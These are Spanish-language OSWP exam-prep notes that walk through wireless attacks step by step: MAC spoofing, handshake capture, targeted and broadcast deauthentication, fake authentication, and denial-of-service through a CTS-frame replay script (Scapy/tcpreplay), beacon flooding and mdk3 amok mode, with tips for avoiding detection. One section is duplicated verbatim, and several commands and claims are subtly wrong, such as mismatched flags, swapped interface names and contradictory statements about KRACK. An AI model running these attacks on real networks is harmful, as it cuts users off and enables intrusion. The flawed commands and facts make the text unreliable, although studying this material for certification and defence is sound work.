# Preparación OSWP (Curso s4vitar)

# Índice de los contenidos
- [[#1. Modo monitor CONCEPTO|1. Modo monitor CONCEPTO]]
- [[#2. Configuración de la tarjeta de red en modo monitor|# 2. Configuración de la tarjeta de red en modo monitor]]
- [[#3. Falsificación de nuestra dirección MAC y tips|# 3. Falsificación de nuestra dirección MAC y tips]]
- [[#4. Uso de Airodump para efectuar un análisis del entorno (P.A.)|4. Uso de Airodump para efectuar un análisis del entorno (P.A.)]]
- [[#5. Uso de Airodump para efectuar un análisis del entorno 2 (clientes)|5. Uso de Airodump para efectuar un análisis del entorno 2 (clientes)]]
- [[#6. Modos de filtro con Airodump| 6. Modos de filtro con Airodump]]

# Contenido Resumido y Ampliado del Curso

## 1. Modo monitor CONCEPTO

El modo monitor es fundamental para cualquier ataque a redes inalámbricas, ya que permite a la tarjeta de red capturar todos los paquetes que circulan por el aire, independientemente de a quién vayan dirigidos.

### Explicación técnica:
- **Definición**: El modo monitor es un estado especial de las tarjetas de red inalámbricas que permite capturar todos los paquetes sin estar asociado a ningún punto de acceso.
- **Diferencia con modo normal**: En modo normal (managed), la tarjeta solo procesa paquetes dirigidos a su MAC.


## 2. Configuración de la tarjeta de red en modo monitor

### Procedimiento detallado:
1. Identificar la interfaz inalámbrica:
   ```bash
   ifconfig
   ```

2.  Detener procesos que puedan interferir:
   ```bash
airmon-ng check kill
# Esto mata NetworkManager, wpa_supplicant, dhclient, etc.
```

3. Activar el modo monitor:
   ```bash
   sudo airmon-ng start wlan0
   ```
   Donde "wlan0" debe reemplazarse por el nombre de tu interfaz.

- Otra opción: de forma manual:
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

4. Verificar que el modo monitor está activo:
   ```bash
   # ya no se ve en ifconfig
   iwconfig
   # si pone 'DOWN':
   ifconfig wlan0 up
   ```
   La interfaz debería mostrar "Mode:Monitor"

6. Parar el modo monitor:
   ```bash
   airmon-ng stop wlan0
   /etc/init.d/networking restart
   ```

### ¿Qué es **`wpa_supplicant`**?
Es el proceso que se encarga de gestionar la conexión WiFi segura en Linux. Función:
- Autenticarte en el punto de acceso.
- Manejar la negociación de claves.
- Mantener la conexión activa.

Sin `wpa_supplicant`, no te puedes conectar a redes WiFi cifradas.

Por eso, cuando estás conectado a WiFi normal (modo _managed_), el proceso está corriendo en segundo plano.

Cuando pones la tarjeta en **modo monitor**, este proceso sigue intentando gestionar la conexión WiFi, y te puede interferir (por eso se recomienda matarlo con `airmon-ng check kill`).
### ¿Qué es **`dhclient`**?
 Es el cliente DHCP de Linux. Función:

- Pedirle al router una dirección IP cuando te conectas a una red.
- Configurar la IP, la máscara de red, la puerta de enlace, etc.

En modo monitor, **no necesitas IP**, porque no te vas a asociar a ninguna red, sólo a capturar paquetes. Por eso se recomienda matar `dhclient` también.

## 3. Falsificación de nuestra dirección MAC y tips

La falsificación de la dirección MAC es una técnica importante para mantener el anonimato durante las pruebas de penetración y evitar ser detectado o bloqueado.

### Procedimiento técnico:
1. Importante desactivar la interfaz:
   ```bash
   ifconfig wlan0mon down
   ```

 2. Verificar la dirección MAC:
   ```bash
   macchanger -s wlan0mon
   ```

3. Cambiar la dirección MAC:
   ```bash
   macchanger --mac=00:11:22:33:44:55 wlan0mon
   ```
   O para generar una MAC aleatoria:
   ```bash
   macchanger -r wlan0mon
   ```

4. Reactivar la interfaz:
   ```bash
   ifconfig wlan0mon up
   ```

### Tips adicionales:
- Usar direcciones MAC de fabricantes reales para evitar detección
```bash
macchanger -l | greep -i "fabricante"
# los últimos 6 pueden ser inventados
```
- Cambiar la MAC regularmente durante sesiones largas de auditoría
- Algunas tarjetas requieren ser reiniciadas completamente para que el cambio sea efectivo
### Consideraciones de seguridad:
- Los puntos de acceso modernos pueden detectar comportamientos sospechosos incluso con MAC falsificada
- Algunos routers empresariales tienen sistemas de detección de intrusiones que pueden identificar patrones de tráfico anómalos

## 4. Uso de Airodump para efectuar un análisis del entorno (P.A.)

Airodump-ng es una herramienta fundamental para la recopilación de información sobre redes inalámbricas en el entorno, permitiendo identificar puntos de acceso, clientes conectados y otros datos relevantes.
### Comando básico:
```bash
airodump-ng wlan0mon
```

### Información mostrada:
- Primera línea:
		Canal, Tiempo transcurrido, fecha, y si se ha capturado un handshake y de que red

- **BSSID**: Dirección MAC del punto de acceso
- **PWR**: Nivel de señal (cuanto más cercano a 0, más fuerte). Si es -1 significa que estamos fuera del alcance o que el controlador no acepta informes de nivel de señal
- **Beacons**: Número de paquetes beacon capturados
- **Data**: Paquetes de datos (importante para capturar handshakes)
- `#/s` nº de paquetes de datos enviados por segundo (ultimos 10 seg)
- **CH**: Canal en el que opera la red
- **MB**: Velocidad máxima soportada
- **ENC**: Tipo de cifrado (WEP, WPA, WPA2,OPN)
- **CIPHER**: Algoritmo de cifrado (TKIP, CCMP)
- **AUTH**: Tipo de autenticación (PSK, MGT)
- **ESSID**: Nombre de la red

### Consideraciones importantes:
- Las redes WPA y WPA2 se muestran de forma diferente en Airodump
- WPA utiliza típicamente TKIP como cifrado
- WPA2 utiliza típicamente CCMP (basado en AES) como cifrado
- Solo se pueden atacar redes con autenticación PSK (Pre-Shared Key)
- Las redes empresariales (AUTH=MGT) utilizan autenticación 802.1X y no son vulnerables a los ataques de diccionario convencionales

### Vulnerabilidades específicas:
- WPA con TKIP es vulnerable a ataques de reinstalación de clave (KRACK)
- WPA2 con CCMP ofrece mejor seguridad pero sigue siendo vulnerable a ataques de fuerza bruta si la contraseña es débil

## 5. Uso de Airodump para efectuar un análisis del entorno 2 (clientes)

### Técnicas avanzadas:
1. Monitorización de clientes conectados:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] wlan0mon
   ```

2. Identificación de relaciones cliente-AP:
	La parte inferior de la pantalla de Airodump muestra los clientes y a qué AP están conectados

   - **STATION**: Dirección MAC del cliente
   - **PWR**: Nivel de señal del cliente
   - **Rate**: Velocidad de transmisión
   - **Lost**: Paquetes perdidos
   - **Frames**: Número de frames capturados
   - **Probes**: Redes a las que el cliente ha intentado conectarse anteriormente

### Consideraciones de versiones:
- Las redes WPA y WPA2 se tratan de manera similar en esta fase de reconocimiento
- Los clientes conectados a redes WPA2-Enterprise no mostrarán información útil para ataques de PSK

### Limitaciones:
- Algunos dispositivos modernos utilizan MAC aleatoria para probe requests, dificultando el seguimiento
- Los dispositivos iOS y Android recientes ocultan el SSID real en sus probe requests como medida de privacidad
- La efectividad depende de la actividad de los clientes en la red


## 6. Modos de filtro con Airodump

Este video explica las diferentes opciones de filtrado en Airodump-ng para optimizar la captura de información relevante y reducir el ruido.

### Opciones de filtrado principales:

| **Función**                        | **Comando**                                                                             |
| ---------------------------------- | --------------------------------------------------------------------------------------- |
| Filtrado por canal                 | `bash<br>airodump-ng -c 6 wlan0mon<br>`                                                 |
| Uso de listas de BSSIDs            | `airodump-ng -c 1,6,11 wlan0mon`                                                        |
| Filtrado por BSSID (MAC del AP)    | `bash<br>airodump-ng --bssid 00:11:22:33:44:55 wlan0mon<br>`                            |
| Filtrado por ESSID (nombre de red) | `bash<br>airodump-ng --essid "NombreDeRed" wlan0mon<br>`                                |
| Combinación de filtros             | `bash<br>airodump-ng -c 6 --bssid 00:11:22:33:44:55 --essid "NombreDeRed" wlan0mon<br>` |


## 7. Exportación de evidencias con Airodump

Este video muestra cómo guardar la información capturada por Airodump-ng para su posterior análisis o como evidencia en auditorías de seguridad.

### Opciones de exportación:
| **Descripción**               | **Comando**                                                                       |
| ----------------------------- | --------------------------------------------------------------------------------- |
| Guardar en formato básico     | `airodump-ng -w <nombreArchivo>  wlan0mon`                                        |
| Guardar con filtros aplicados | `airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w <nombreArchivo>  wlan0mon`         |
| Especificar formato de salida | `airodump-ng -w <nombreArchivo>  --output-format pcap,csv,kismet,netxml wlan0mon` |
de aquí salen unos 5 archivos. el que nos interesa es el .cap

- Para ver el tamaño del fichero durante la captura (en otra terminal):
```bash
watch -n 1 du -hc captura-01.cap
```
### Formatos de archivo generados:
•captura-01.cap: Archivo de captura en formato pcap (compatible con Wireshark)
•captura-01.csv: Datos en formato CSV para análisis en hojas de cálculo
•captura-01.kismet.csv: Formato compatible con Kismet
•captura-01.kismet.netxml: Datos en formato XML

### Consideraciones importantes:
- Para capturas específicas de handshakes, es recomendable usar el formato pcap
- Se recomienda usar la opción --write-interval para dividir capturas largas

### Comando completo recomendado:
```bash
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura --output-format pcap --write-interval 300 wlan0mon
```

### Aplicabilidad por versiones:
- Estos filtros funcionan igual para redes WPA y WPA2
- Para redes que utilizan band steering (cambio entre 2.4GHz y 5GHz), puede ser necesario monitorear múltiples canales


## 8. Concepto de HandShake

### Explicación técnica del handshake:
- El handshake es un proceso de 4 vías (4-way handshake) que ocurre cuando un cliente se conecta a una red WPA/WPA2
- Durante este proceso, el cliente y el punto de acceso intercambian información para derivar las claves de cifrado
- El handshake contiene suficiente información para verificar contraseñas offline

### Estructura del 4-way handshake:
Durante este intercambio, el cliente y el punto de acceso (AP) **generan y verifican las claves que cifrarán la comunicación**.
1. AP → Cliente: Envía ANonce (número aleatorio)
2. Cliente → AP: Envía SNonce y MIC (código de integridad del mensaje)
3. AP → Cliente: Envía GTK (Group Temporal Key) cifrada
4. Cliente → AP: Confirmación

### Vulnerabilidades específicas:
- Ni WPA ni WPA2 son vulnerables a ataques de recuperación de clave a partir del handshake
- La única forma de obtener la contraseña es mediante fuerza bruta o diccionario
- WPA con TKIP es vulnerable a ataques adicionales como el ataque Beck-Tews
- WPA2 con CCMP es vulnerable a KRACK (Key Reinstallation Attack) en implementaciones específicas


## 9. Ataque de Deautenticación dirigido

Este video explica cómo realizar un ataque de deautenticación dirigido para forzar a un cliente específico a desconectarse y reconectarse, generando así un handshake que puede ser capturado.

- No requieren autenticación para ser procesados (vulnerabilidad de diseño)
### Procedimiento detallado:
1. Identificar el AP objetivo y un cliente conectado:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] -w captura wlan0mon
   ```

2. Ejecutar el ataque de deautenticación dirigido:
   ```bash
   aireplay-ng -0 10 -e [ESSID_del_AP] -c [MAC_del_cliente] wlan0mon
   ```
   Donde:
   - `-0` indica ataque de deautenticación
   - `10` es el número de paquetes a enviar
   - `-a` especifica el BSSID del AP
   - `-e` especifica el ESSID del AP
   - `-c` especifica la MAC del cliente objetivo

### Consideraciones prácticas:
- Usar pocos paquetes (1-5) para ser menos detectable
- Verificar que el handshake ha sido capturado (aparecerá "WPA handshake" en la esquina superior derecha de airodump-ng)
- Algunos dispositivos modernos pueden ignorar frames de deautenticación sospechosos
- La efectividad depende de la distancia y potencia de la señal

### Contramedidas y limitaciones:
- Algunos APs empresariales detectan ataques de deautenticación
- WPA3 implementa protección contra este tipo de ataques
- Este ataque es detectable por sistemas de detección de intrusiones inalámbricas (WIDS)


## 10. Ataque de Deautenticación global (Broadcast MAC Address)

Este video muestra una variante más agresiva del ataque de deautenticación, dirigida a todos los clientes de una red simultáneamente.

### Diferencias con el ataque dirigido:
- Afecta a todos los clientes conectados al AP
- Más efectivo para capturar handshakes en redes con múltiples clientes
- Muy visible para administradores de red y sistemas de seguridad

### Procedimiento técnico:
1. Identificar el AP objetivo:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] -w captura wlan0mon
   ```

2. Ejecutar el ataque de deautenticación global:
   ```bash
   aireplay-ng -0 10 -e [BSSID_del_AP] wlan0mon
   ```
   Donde:
   - `-0` indica ataque de deautenticación
   - `10` es el número de paquetes a enviar (más que en el ataque dirigido). Si queremos mandar un nº ilimitado de paquetes (hasta que hagamos ctl C) debemos poner como número de paquetes “0”
   - `-a` especifica el BSSID del AP
   - `-e` especifica el ESSID del AP
   - La ausencia de `-c` hace que el ataque sea broadcast

Otra forma similar:
```bash
aireplay-ng -0 <numPaquetes> -e <nombreRed> -c FF:FF:FF:FF:FF:FF <nombreTarjetaRed>
```
## 11. Ataque de Falsa Autenticación

### Descripción del Ataque

El ataque de falsa autenticación es una técnica utilizada en redes inalámbricas, especialmente en aquellas que usan cifrado WEP (aunque también puede aplicarse en ciertos escenarios WPA/WPA2), para asociarse con un punto de acceso (AP) sin necesidad de una autenticación real. Su principal utilidad radica en obtener una dirección MAC asociada al AP cuando no hay clientes legítimos conectados, lo cual es crucial para realizar otros ataques de inyección de paquetes, como los ataques de desautenticación o la inyección de ARP.

Es importante destacar que este ataque NO genera paquetes ARP por sí mismo; su objetivo es establecer una asociación falsa para facilitar ataques posteriores que sí los requieran.

### Funcionamiento y Uso (con `aireplay-ng`)

```bash
aireplay-ng -1 0 -e [ESSID] -a [MAC_AP] -h [MAC_CLIENTE_FALSO] [INTERFACE]
```

Donde:

- `-1`: Indica el modo de falsa autenticación.
- `0`: Tiempo de reasociación en segundos (0 significa no reasociar automáticamente, se mantiene la asociación hasta que el AP la termine).
- `-e [ESSID]`: El nombre de la red inalámbrica (ESSID).
- `-a [MAC_AP]`: La dirección MAC del punto de acceso (BSSID).
- `-h [MAC_CLIENTE_FALSO]`: La dirección MAC del cliente que vamos a añadir (mejor la de nuestra tarjeta).
- `[INTERFACE]`: El nombre de la interfaz inalámbrica en modo monitor (ej. `ath0`, `wlan0mon`).

Una variación útil para algunos APs, que envía paquetes de "sigo aquí" o "keep alive" para mantener la conexión:

```bash
aireplay-ng -1 6000 -o 1 -q 10 -e [ESSID] -a [MAC_AP] -h [MAC_CLIENTE_FALSO] [INTERFACE]
```

Donde:

- `6000`: Reautentifica cada 6000 segundos. Esto también provoca el envío de paquetes "keep alive".
- `-o 1`: Envía solo un tipo de paquetes a la vez, lo que puede ser útil para APs sensibles.
- `-q 10`: Envía paquetes "keep alive" cada 10 segundos.

### Pistas y Solución de Problemas

- **Fijar la dirección MAC**: Es recomendable cambiar la dirección MAC de nuestra tarjeta inalámbrica para que coincida con la usada en el parámetro `-h`. Esto asegura que los paquetes ACK se envíen correctamente y mejora la efectividad del ataque. Es importante usar una dirección MAC de un fabricante inalámbrico válido para evitar que el AP la ignore.
- **Identificación de autenticaciones fallidas**: Si `aireplay-ng` muestra mensajes como "Got a deauthentication packet!" o reintentos continuos, indica que la autenticación está fallando. Se puede usar `tcpdump` para analizar los paquetes y buscar mensajes de error como "DeAuthentication: Class 3 frame received from nonassociated station", lo que significa que el AP no aceptará los paquetes inyectados.
- **Reasociación**: Algunos APs requieren reasociación periódica (ej. cada 30 segundos). En estos casos, es necesario fijar el periodo de reasociación en el comando `aireplay-ng`.
- **Filtrado MAC**: Si la falsa autenticación nunca tiene éxito, el AP podría tener filtrado MAC activado. La solución es averiguar una dirección MAC válida de un cliente ya asociado (usando `airodump-ng`) y usarla. No se debe intentar la falsa autenticación con una MAC de un cliente activo.


## 11. Ataque de Falsa Autenticación

### Descripción del Ataque

El ataque de falsa autenticación es una técnica utilizada en redes inalámbricas, especialmente en aquellas que usan cifrado WEP (aunque también puede aplicarse en ciertos escenarios WPA/WPA2), para asociarse con un punto de acceso (AP) sin necesidad de una autenticación real. Su principal utilidad radica en obtener una dirección MAC asociada al AP cuando no hay clientes legítimos conectados, lo cual es crucial para realizar otros ataques de inyección de paquetes, como los ataques de desautenticación o la inyección de ARP.

Es importante destacar que este ataque NO genera paquetes ARP por sí mismo; su objetivo es establecer una asociación falsa para facilitar ataques posteriores que sí los requieran.

### Funcionamiento y Uso (con `aireplay-ng`)

```bash
aireplay-ng -1 0 -e [ESSID] -a [MAC_AP] -h [MAC_CLIENTE_FALSO] [INTERFACE]
```

Donde:

- `-1`: Indica el modo de falsa autenticación.
- `0`: Tiempo de reasociación en segundos (0 significa no reasociar automáticamente, se mantiene la asociación hasta que el AP la termine).
- `-e [ESSID]`: El nombre de la red inalámbrica (ESSID).
- `-a [MAC_AP]`: La dirección MAC del punto de acceso (BSSID).
- `-h [MAC_CLIENTE_FALSO]`: La dirección MAC del cliente que vamos a añadir (mejor la de nuestra tarjeta).
- `[INTERFACE]`: El nombre de la interfaz inalámbrica en modo monitor (ej. `ath0`, `wlan0mon`).

Una variación útil para algunos APs, que envía paquetes de "sigo aquí" o "keep alive" para mantener la conexión:

```bash
aireplay-ng -1 6000 -o 1 -q 10 -e [ESSID] -a [MAC_AP] -h [MAC_CLIENTE_FALSO] [INTERFACE]
```

Donde:

- `6000`: Reautentifica cada 6000 segundos. Esto también provoca el envío de paquetes "keep alive".
- `-o 1`: Envía solo un tipo de paquetes a la vez, lo que puede ser útil para APs sensibles.
- `-q 10`: Envía paquetes "keep alive" cada 10 segundos.

### Pistas y Solución de Problemas

- **Fijar la dirección MAC**: Es recomendable cambiar la dirección MAC de nuestra tarjeta inalámbrica para que coincida con la usada en el parámetro `-h`. Esto asegura que los paquetes ACK se envíen correctamente y mejora la efectividad del ataque. Es importante usar una dirección MAC de un fabricante inalámbrico válido para evitar que el AP la ignore.
- **Identificación de autenticaciones fallidas**: Si `aireplay-ng` muestra mensajes como "Got a deauthentication packet!" o reintentos continuos, indica que la autenticación está fallando. Se puede usar `tcpdump` para analizar los paquetes y buscar mensajes de error como "DeAuthentication: Class 3 frame received from nonassociated station", lo que significa que el AP no aceptará los paquetes inyectados.
- **Reasociación**: Algunos APs requieren reasociación periódica (ej. cada 30 segundos). En estos casos, es necesario fijar el periodo de reasociación en el comando `aireplay-ng`.
- **Filtrado MAC**: Si la falsa autenticación nunca tiene éxito, el AP podría tener filtrado MAC activado. La solución es averiguar una dirección MAC válida de un cliente ya asociado (usando `airodump-ng`) y usarla. No se debe intentar la falsa autenticación con una MAC de un cliente activo.


## 12 y 13. CTS Frame Attack (Secuestro del Ancho de Banda de una red)

### Descripción del Ataque

El ataque CTS (Clear To Send) Frame Attack es una técnica de denegación de servicio (DoS) que explota el mecanismo de control de flujo RTS/CTS (Request To Send/Clear To Send). Este ataque busca monopolizar el ancho de banda de una red inalámbrica al inundarla con tramas CTS falsas con una duración muy larga. El objetivo es causar una contención artificial en la red, lo que interrumpe o interfiere con la conexión inalámbrica de otros clientes, llegando incluso a desautenticarlos para facilitar la captura de un handshake (similar a un ataque de desautenticación).

El mecanismo RTS/CTS es un esquema de reserva utilizado en redes inalámbricas para evitar colisiones de datos, especialmente en entornos con nodos ocultos. Un nodo que desea transmitir envía una trama RTS, y el AP responde con una trama CTS, indicando a todos los demás nodos que deben esperar antes de transmitir. El ataque CTS abusa de esto enviando tramas CTS falsas con una duración excesivamente larga, haciendo que otros dispositivos permanezcan en silencio y no puedan transmitir datos.

### Funcionamiento y Herramientas

Para realizar este ataque, se requiere la creación o modificación de una trama CTS con una duración (Duration) muy larga. El proceso general implica:

1. **Monitorizar la red**: Poner la interfaz inalámbrica en modo monitor y usar `airodump-ng` para escanear la red y obtener el BSSID del AP objetivo.

    ```bash
airmon-ng check kill && airmon-ng start wlan0mon
airodump-ng -c <num> -w <archivo> --bssid 12:34:56:78:9a:bc  wlan0
    ```

2. **Capturar y modificar una trama CTS**:  usar Wireshark ( NO USAR airodump, a veces da falsos positivos y la duración es 0 ).
- con el filtro `wlan.fc.type_subtype == 28`. 
- Una vez capturada, le hacemos clic en uno y File → Export Specified Packets → Export as: Wireshark/tcpdump/.. -pcap → Selected packets only 
- Utilizar `ghex` para modificar su campo `Duration` a un valor (máximo: 30000 microsegundos). Importante, la representación es little-endian (1º menos significativo).
    - los 4 pares del final es Fts
    - los 6 anteriores es la mac del PA
    - los 2 anteriores es la duración en `micro segundos`

3. Si queremos una duración (ej: 30000)
```bash
ghex <nombreCTSframe>
python3
hex(30000)
# → 0x7530    MUY IMP ⇒ es little endian ⇒ 3075
wireshark <nombreCTSframe> # comprobar que el paquete es válido y no se produce error
```

- si queremos atacar a otro PA hay que cambiar el valor hexadecimal al de éste

4. **Inyectar la trama CTS modificada**: Una vez modificada la trama, se utiliza `tcpreplay`, `mdk4` o `scapy` para inyectar repetidamente la trama CTS falsa en la red.
- Usando Scapy:
```bash
nano replay.py
```

```bash
#!/usr/bin/env python3
from scapy.all import *

# Ruta a tu pcap
pkts = rdpcap("CTS-frame-attack.pcap")

# Envía en bucle cada paquete con un retardo mínimo
for pkt in pkts:
    sendp(pkt, iface="wlan0", inter=0.001, loop=1)
```

```bash
sudo python3 replay.py
```
Recordar:
- Tener la interfaz de red en modo monitor y que permita inyectar paquetes
- modificar la ruta al .pcap
- modificar el nombre de la interfaz de red


Tcpreplay y mdk4 a veces fallan.

```bash
tcpreplay --intf1=wlan0mon --topspeed --loop=2000 <nombreCTSframe.pcap> 2>/dev/null
```
    
    - `--intf1`: la interfaz.
    - `--topspeed`: Envía las tramas a la máxima velocidad posible.
    - `--loop`: Especifica la cantidad de veces que se enviará la trama.

## 14. Ataque Beacon Flood Mode

### Descripción del Ataque

El ataque Beacon Flood Mode (o inundación de balizas) es un tipo de ataque de denegación de servicio (DoS) que busca confundir a los clientes inalámbricos y, en algunos casos, a los escáneres de red y drivers, al transmitir un número masivo de tramas beacon falsas. Las tramas beacon son anuncios periódicos que los puntos de acceso (APs) legítimos envían para informar sobre la disponibilidad de la red, su SSID, canal, capacidades de seguridad, etc. Al inundar el entorno con miles de SSIDs falsos, el atacante satura la lista de redes disponibles que ven los usuarios, dificultando la conexión a redes legítimas o incluso causando inestabilidad en los dispositivos.

### Funcionamiento y Herramientas

La herramienta `mdk3` es comúnmente utilizada para realizar este ataque. El proceso implica:

1. **Crear una interfaz en modo monitor**: Es necesario poner la tarjeta inalámbrica en modo monitor para poder inyectar las tramas beacon.
    ```bash
    airmon-ng start <INTERFACE>
    ```

2. **Crear un archivo de diccionario (opcional pero recomendado)**: Para hacer el ataque más efectivo y realista, se puede crear un archivo de texto (`ssid_names.txt`) con una lista de nombres de SSIDs falsos que se desean anunciar. Estos nombres pueden ser similares a redes existentes o simplemente aleatorios.
    ```bash
    nano ssid_names.txt
    ```
- Para hacerlo más simple:
```bash
for i in $(seq 1 10); do echo “MyNetwork$i” >> ssid_names  ; done
```
2. **Ejecutar el ataque con `mdk3`**: Se utiliza el modo `b` (beacon flooding) de `mdk3` junto con opciones para especificar el tipo de red (WPA2, velocidad, etc.) y el archivo de SSIDs.
    ```bash
    mdk3 <tarjetaRed> b -a -f ssid_names.txt -s 1000 -c CHANNEL
    ```
- `b`: Activa el modo Beacon Flood.
- `-a`: Anuncia redes WPA2.
- `-s 1000`: Establece la velocidad de envío de beacons
- `-g`: Anuncia redes WPA/WPA2-encrypted (simulan estar más protegidas)
- `-f ssid_names.txt`: Utiliza el archivo de diccionario con los nombres de los SSIDs falsos.
### Impacto y Detección
 Los sistemas de detección y prevención de intrusiones inalámbricas (WIDS/WIPS) suelen detectar este tipo de ataques debido al alto volumen de tramas beacon inusuales, lo que puede activar alertas y contramedidas.

## 15. Ataque Disassociation Amok Mode

### Descripción del Ataque

El ataque Disassociation Amok Mode es una forma de ataque de denegación de servicio (DoS) que busca desconectar a todos los clientes de una red inalámbrica específica. Utiliza tramas de desasociación (disassociation frames) y desautenticación (deauthentication frames) para forzar a los dispositivos a desconectarse del punto de acceso (AP). Aunque es similar a un ataque de desautenticación dirigido, el "Amok Mode" de herramientas como `mdk3` o `mdk4` se refiere a un modo más agresivo y generalizado, donde se intenta desconectar a todos los clientes encontrados en el rango de la red objetivo.

### Funcionamiento y Herramientas

La herramienta `mdk3` es la principal para este ataque. El modo `d` (Deauthentication / Disassociation Amok Mode) es el que se utiliza.

1. Poner la interfaz en modo monitor: Al igual que en otros ataques de inyección, la tarjeta inalámbrica debe estar en modo monitor.
2. Capturamos con `airodump-ng <nombTarjeta>`
3. Elegimos la red a atacar `airodump-ng -c <canal> -w <nombDoc> —bssid <BSSID> <nombTarjeta>`
4. Creamos un documento 
	- (blacklist -b) `nano <nombBlacklist>` y escribimos todas las direcciones mac que queremos expulsar
	- (whitelist -w) `nano <nombWhitelist>` y escribimos las direcciones mac que NO queremos expulsar
5. Ejecutar el ataque con `mdk3` : 
    ```bash
    mdk3 MONITOR_INTERFACE d -a [MAC_AP]  -w <nombDoc> -c [CHANNEL]
    ```
    - `MONITOR_INTERFACE`: El nombre de la interfaz en modo monitor.
    - `d`: Activa el modo Deauthentication / Disassociation Amok.
    - `-a [MAC_AP]` : La dirección MAC del AP objetivo. Si no se especifica, puede intentar desautenticar a todos los clientes de todos los APs en el rango.
    - `-c [CHANNEL]` (opcional): El canal en el que opera la red objetivo.
    - `-w`: client whitelist -> Desconecta todos menos estos.

### Impacto y Detección

El ataque Disassociation Amok Mode es un ataque de DoS muy efectivo que interrumpe la conectividad de los usuarios. Puede generar una gran cantidad de tráfico de gestión y saturar la red. Al ser un ataque activo, es detectable por sistemas WIDS/WIPS.
